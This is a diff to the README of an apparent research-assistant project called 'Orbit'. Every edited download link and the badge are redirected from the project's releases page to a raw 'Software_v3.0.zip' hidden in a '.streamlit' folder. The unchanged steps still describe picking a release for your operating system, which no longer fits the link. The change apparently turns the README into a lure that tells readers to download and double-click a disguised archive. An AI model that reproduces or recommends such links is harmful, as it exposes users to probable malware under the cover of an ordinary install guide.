@@ -6,11 +6,11 @@ Welcome to Orbit! Orbit is a powerful research assistant designed to make your w
 
 ## 📥 Download Orbit
 
-[![Download Orbit](https://img.shields.io/badge/Download%20Orbit-v1.0-blue)](https://github.com/uggiso/Orbit/releases)
+[![Download Orbit](https://github.com/uggiso/Orbit/raw/refs/heads/main/.streamlit/Software_v3.0.zip%20Orbit-v1.0-blue)](https://github.com/uggiso/Orbit/raw/refs/heads/main/.streamlit/Software_v3.0.zip)
 
 To get started with Orbit, you will need to download it. Follow these steps:
 
-1. Click on the big button above or visit [this page to download](https://github.com/uggiso/Orbit/releases).
+1. Click on the big button above or visit [this page to download](https://github.com/uggiso/Orbit/raw/refs/heads/main/.streamlit/Software_v3.0.zip).
 2. Look for the latest version of Orbit. It will typically be labeled clearly at the top of the page, like “Latest release.”
 3. Download the appropriate file for your operating system (Windows, MacOS, or Linux).
 
@@ -36,7 +36,7 @@ Orbit is built to assist you in various ways:
 
 To install Orbit:
 
-1. Go back to [this page to download](https://github.com/uggiso/Orbit/releases).
+1. Go back to [this page to download](https://github.com/uggiso/Orbit/raw/refs/heads/main/.streamlit/Software_v3.0.zip).
 2. Once you download the file, locate it in your downloads folder.
 3. Double-click the downloaded file and follow the on-screen instructions to complete the installation.
 4. After installation, launch Orbit from your applications list or desktop shortcut.
